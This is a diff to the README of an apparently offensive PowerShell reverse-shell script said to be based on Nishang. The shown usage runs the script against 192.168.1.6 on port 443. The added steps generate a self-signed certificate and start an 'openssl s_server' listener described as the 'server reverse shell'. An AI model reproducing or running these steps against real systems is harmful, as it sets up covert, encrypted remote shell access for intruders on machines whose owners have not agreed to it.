@@ -5,6 +5,13 @@ This script is based on Nishang's, thanks for sharing<br>
 ```sh
 .\rc2.ps1 192.168.1.6 443
 ```
+## Generate Certificate 
+
+```sh
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+```
+
+## Generate server reverse shell
 
 ```sh
 openssl s_server -quiet -key key.pem -cert cert.pem -port 443
